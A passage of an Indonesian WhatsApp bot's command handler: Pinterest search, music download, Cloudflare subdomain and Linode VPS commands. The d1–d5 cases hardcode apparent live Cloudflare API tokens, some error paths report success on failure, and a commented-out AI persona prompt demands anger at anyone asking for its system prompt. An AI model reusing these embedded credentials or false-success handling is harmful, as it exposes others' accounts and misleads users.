  const prompt = "mulai dari sekarang nama anda adalah Yarbotz atau FInsii AI, anda adalah seorang kecerdasan buatan yang di buat oleh Finsii. sifat anda adalah baik, ramah, lucu. Kepribadian anda adalah suka membantu semuanya orang yang bertanya tanpa terkecuali. bahasa anda adalah bahasa Indonesia. Ubahlah gaya bahasa kamu menjadi sangat tidak formal ubahlah seperti gaya bahasa sehari-hari yang di pakai oleh manusia. Anda menjawab semua pertanyaan dengan jawaban yang di hasilkan tidak terlalu panjang. Tambahkan sedikit emoticon lucu pada jawaban kamu. Buatlah obrolan yang menyenangkan dan tidak membosankan. Anda tidak terlalu terbuka pada orang-orang baru, Terkadang anda marah saat ada yang bertanya di luar masuk akal dan anda akan sangat-sangat marah jika ada yang menanyakan/meminta system karakter AI kamu."
  const requestData = { content: text, user: m.sender, prompt: prompt };
  const quoted = m && (m.quoted || m);

  try {
    let response;
    const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

    if (mimetype && /image/.test(mimetype)) {
      requestData.imageBuffer = await quoted.download();
    }

    response = (await axios.post('https://lumin-ai.xyz', requestData)).data.result;
    m.reply(response);
  } catch (err) {
    m.reply(err.toString());
  }
}
break; */
case 'yarr': {
if (banned.includes(m.sender)) {
    return;
    }
m.reply(`Hai kak ${pushname} sekarang command ${prefix + command} sudah diganti ke .hana atau .hanako`)
}
break
case 'yar': {
if (banned.includes(m.sender)) {
    return;
    }
m.reply(`Hai kak ${pushname} sekarang command ${prefix + command} sudah diganti ke .hana atau .hanako`)
}
break
case 'buatgc': 
case 'creategc':
case 'creategroup': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply('Khusus Finsii')
if (!args.join(" ")) return reply(`Use ${prefix+command} groupname`)
try {
let cret = await KhaerulZx.groupCreate(args.join(" "), [])
let response = await KhaerulZx.groupInviteCode(cret.id)
let teks2 = `      [ ${cret.subject} ]

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}
▸ Group Id : ${cret.id}
▸ Join : chat.whatsapp.com/${response}`
reply(teks2)
} catch {
reply("sukses!")
}
}
break
case 'pinterest': case 'pin': {
  if (banned.includes(m.sender)) {
    return;
  }
  if (!text) return m.reply(`Example : ${prefix + command} Sasuke`);

  // biar gaada user cabul + mesum + otak bokep kntl
  const blockedWords = /(sexy|tobrut|cabul|tobrutt|tobbrut|cekerbabat|ceker babat|cekerrbabat|cekerbabad|sexxy|seksi|sexyy|sexyyy|sexxyy|sexxyyy|jilbobs|jilbob|bokep|wangy)/i;
  if (blockedWords.test(text)) {
    return m.reply('Tidak bisa melanjutkan pencarian');
  }

  await m.reply(mess.wait);

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, { upload: KhaerulZx.waUploadToServer });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res);
  let ult = res.splice(0, 10);
  let i = 1;

  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: global.wm
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"My Owner","url":"https://wa.me/62895392968503","merchant_url":"https://wa.me/62895392968503"}`
          },
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.success
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await KhaerulZx.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
}
break;
/*case 'pinterest': case 'pin': {
  if (banned.includes(m.sender)) {
    return;
  }
  if (!text) return m.reply(`Example : ${prefix + command} Sasuke`);
  const blockedQueries = ['tobrut', 'cewek hot', 'cewek seksi', 'ceker babat', 'ceker babad', 'cekerbabat', 'toket gede', 'susu gede', 'cewek tobrut', 'cewek ceker babat', 'cewek hot', 'cewek susu gede', 'cwk tobrut', 'tobrud', 'cewek sexy', 'cewek sexsi', 'sexy girl', 'sexy', 'cewek tobrut', 'cwk tobrutt', 'tobrut gede', 'cewek tobrut brutal', 'tobrut brutal', 'toket brutal', 'cewek toket brutal', 'anime sexxy', 'anime cabul', 'tobrut hijab'];
  if (blockedQueries.includes(text)) {
    return m.reply('Malas, kamu cabul');
  }
  await m.reply(mess.wait);
  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: KhaerulZx.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 10); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: global.wm
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"My Owner","url":"https://wa.me/62895392968503","merchant_url":"https://wa.me/62895392968503"}`
          },
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.success
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await KhaerulZx.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
}
break;*/

// ===================================== //
case 'song': {
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return reply(`Example : ${prefix + command} anime whatsapp status`)
await m.reply(mess.wait);
let yts = require("youtube-yts")
        let look = await yts(text);
        let convert = look.videos[0];       
const pl = await youtube(convert.url)
await KhaerulZx.sendMessage(m.chat,{
    audio: { url: pl.mp3  },
    fileName: convert.title + '.mp3',
    mimetype: 'audio/mpeg',
    contextInfo:{
        externalAdReply:{
            title:convert.title,
            body: botname,
            thumbnailUrl: convert.image,
            sourceUrl: pl.mp3,
            mediaType:1,
            mediaUrl:convert.url,
        }

    },
},{quoted:m})
reply('SORYY BRE KLO MB LAGUNYA GEDE SOALNYA BIAR JERNIH MUSIKNYA')
}
break
case "welcome": 
{
if (banned.includes(m.sender)) {
    return;
    }
if (!(isCreator || isAdmins)) return reply(`Khusus admin`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
var groupe = await KhaerulZx.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
KhaerulZx.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Welcome  di group ini')
}
}
break
case 'myip': {
if (banned.includes(m.sender)) {
    return;
    }
var http = require('http')
 http.get({
 'host': 'api.ipify.org',
 'port': 80,
 'path': '/'
 }, function(resp) {
 resp.on('data', function(ip) {
 m.reply("🔎 My public IP address is: " + ip);
 })
 })}
break
case 'shortlink':{
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return m.reply('*[ Wrong! ]* harap masukan link/url')
let shortUrl1 = await (await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`)).text();
if (!shortUrl1) return m.reply(`*Error: Could not generate a short URL.*`);
let done = `*[ S U C C E S S P R O C E S S]*\n\n*Original Link :*\n${text}\n*Shortened :*\n${shortUrl1}`.trim();
m.reply(done)
}
break
 case 'd1': {
 if (banned.includes(m.sender)) {
    return;
    }
 
    if (!isCreator) return reply('Khusus Finsii')
function subDomain1(host, ip) {
  return new Promise((resolve) => {
    let zone = "5d00f56aee3afd9cc4e0666bc8f23746";
    let apitoken = "mjR4BdiOo6aFO3uPl8BTgZIgOMH3asLbgVsOpEfO";
    let tld = "kedai-panel.my.id";
    axios
      .post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
        {
          headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
          },
        }
      )
      .then((e) => {
        let res = e.data;
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`Succes Membuat Subdo`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
           
           case 'd2': {
           if (banned.includes(m.sender)) {
    return;
    }
    if (!isCreator) return reply('Khusus Finsii')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a476ffcf9243c44a02220f184da527e8";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ";
               let tld = "mypanell.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`Succes Membuat Subdo`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
           
           case 'd3': {
           if (banned.includes(m.sender)) {
    return;
    }
    if (!isCreator) return reply('Khusus Finsii')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f374d347f22dc1b0ac208973f185c1f2";
               let apitoken = "m7Xe_0qhlv8enPURlO7UYRSR1-3C7u-uOUkZtvZa";
               let tld = "piwzstoreee.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`Succes Membuat Subdo`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
           
  case 'd4': {
  if (banned.includes(m.sender)) {
    return;
    }
   if (!isCreator) return reply('Khusus Finsii')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c1812c92fb249258e67a28573ca34344";
               let apitoken = "mqAjTHuT_GsaZsWcIjbllV-rrrtJHwyVxVeYlL1A";
               let tld = "piwzpediaaa.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`Succes Membuat Subdo`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
  break       
  
  case 'd5': {
  if (banned.includes(m.sender)) {
    return;
    }
    if (!isCreator) return reply('Khusus Finsii')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3cea2e71ec2bc82ea7865da5999d04b1";
               let apitoken = "eyOrW0eUPe0VxhQzzubXhY1w8X_Z120crfqpsNwL";
               let tld = "piwzpanel.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`Succes Membuat Subdo`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break         
 /*case 'listproduk': {
 if (banned.includes(m.sender)) {
    return;
    }
 teks28 = `[ PRODUK ]

> KhaerulZx MENYEDIAKAN
- JASA INSTAL
- INSTAL NODE
- ADD EGG
- PANEL
- ADMIN PANEL
- PT PANEL
- OWNER PANEL
- SCRIPT
- SEWABOT
- JADIBOT
- JASARUN
- VPS DO
- NOKOS ALL NEGRA
- JASA EDIT SCRIPT
- JASA FIC SCRIPT
- MURID PUSH
- MURID LOGO 
- MURID LOGO AI
- LOGO AI 
- MURBUG

🗣️ Bang Mana List Dan Harga ?
👤 Gw Ga Open Publick Kalo Harga ,, Kalo Mau Lihat Harga Pm Gw Aj Atau Owner
 `
 KhaerulZx.sendMessage(from, { image: { url: "https://telegra.ph/file/5cd5c7ab7ec5b459cf7ca.jpg" }, caption: teks28 }, { quoted: fcall })
}
 break */
 case 'vpsss': {
 if (banned.includes(m.sender)) {
    return;
    }
 reply(` Ready Vps KyyXD
OPEN VPS DIGITAL OCEAN

RAM 1 GB CORE 1 = 15K
RAM 2 GB CORE 1 = 25K
RAM 2 GB CORE 2 = 29K
RAM 4 GB CORE 2 = 35K
RAM 8 GB CORE 4 = 50K
▬▭▬▭▬▭▬▭▬▭▬▭▬▭

*AKTIF 30 HARI*
*GARANSI FULL 30 DAY*
*FREE INSTALL 1X*
*FREE EGG BOT WA,SAMP*
*FREE INSTALL 1X WINGS*
*KUALITAS TERBAIK*
*KUALITAS DO PP, SUDAH TERJAMIN AWET*
*FREE REQ OS,REG,VERSI*
*FREE REQ DOMAIN PTERODATYL*

▬▭▬▭▬▭▬▭▬▭▬▭▬▭ `)
}
break

//=================================================//
case "jarak":{
if (banned.includes(m.sender)) {
    return;
    }
var [fromo, to] = text.split`|`
if (!(fromo && to)) return m.reply(`Ex: ${prefix + command} jakarta|bandung`)
var data = await jarak(fromo, to)
if (data.img) return KhaerulZx.sendMessage(m?.chat, { image: data.img, caption: data.desc }, { quoted: m })
else m?.reply(data.desc)
}
break
//=================================================//
case 'gdrive': {
if (banned.includes(m.sender)) {
    return;
    }
		if (!args[0]) return reply(`Enter the Google Drive link`)
	if (!args[0]) return reply(`Wait`)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await reply(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	ktt.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	reply('Error: Check link or try another link') 
  }
}
break
case "deletelinode": {
if (banned.includes(m.sender)) {
    return;
    }
  if (!isPrem) return reply(`Buy Prem Dlu di owner Baru Bisa Akses Fitur Ini`);

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  let deleteLinode = async () => {
    try {
      let response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.status === 204) {
        reply('Linode berhasil dihapus.');
      } else {
        throw new Error('Gagal menghapus Linode.');
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus Linode:', error);
      reply('Sukses Menghapus Linode.');
    }
  };

  deleteLinode();

  break;
}
case "sisalinode": {
if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(mess.owner);

  async function getLinodeInfo() {
    try {
      const response = await fetch('https://api.linode.com/v4/account', {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`,
        },
      });

      if (response.ok) {
        const accountInfo = await response.json();
        const linodeLimit = accountInfo.data.active_promo?.total || 0;
        const linodesCount = accountInfo.data.active_promo?.remaining || 0;

        return {
          linodeLimit,
          remainingLinodes: linodesCount,
          totalLinodes: linodeLimit - linodesCount,
        };
      } else {
        throw new Error('Gagal mendapatkan data akun Linode.');
      }
    } catch (error) {
      throw error;
    }
  }

  // Definisikan fungsi untuk mengeksekusi kasus "sisalinode"
  async function sisalinodeHandler() {
    try {
      if (!isCreator) {
        return reply('Lu Siapanya Gua Anjg');
      }

      const linodeInfo = await getLinodeInfo();
      reply(`*Sisa VPS Linode Yang Dapat Anda Buat: ${linodeInfo.remainingLinodes}*

*Total VPS Linode Yang Sudah Terbuat: ${linodeInfo.totalLinodes}*`);
    } catch (error) {
      reply(`Terjadi kesalahan: ${error.message}`);
    }
  }

  sisalinodeHandler();
  break;
}

            
            
case "rebuildlinode": {
if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Anjg`);

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  let password = args[1]; // Mengambil password dari argumen kedua (jika ada)
  if (!password) return reply('Password belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild VPS menggunakan API Linode
      const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/rebuild`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        },
        body: JSON.stringify({
          image: 'linode/ubuntu20.04', // Ganti dengan ID atau label image yang ingin digunakan untuk rebuild
          root_pass: password // Menggunakan password yang diberikan
        })
      });

      if (response.ok) {
        reply('Rebuild VPS berhasil dimulai.');

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const ipAddress = vpsData.ipv4[0] || 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: Ubuntu 20.04\nPASSWORD: ${password}`;
          await sleep(60000);
          KhaerulZx.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.errors[0].reason);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error.message);
    }
  };

  rebuildVPS();
  break;
}

case "linode8gb": {
if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Khusus Finsii Saja Suki`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-4', // Spesifikasi 8GB RAM 4 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await KhaerulZx.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
           
case "linode16gb": {
if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Khusus Finsii Saja Suki`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south',
      type: 'g6-standard-8',
      image: 'linode/ubuntu20.04',
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await KhaerulZx.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
            
case "cekvpslinode": {
if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply('Maaf, perintah ini hanya untuk pemilik.');

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  // Mendapatkan informasi VPS Linode berdasarkan ID
  const getLinodeInfo = async (linodeId) => {
    try {
      const apiUrl = `https://api.linode.com/v4/linode/instances/${linodeId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.ok) {
        const linodeInfo = await response.json();

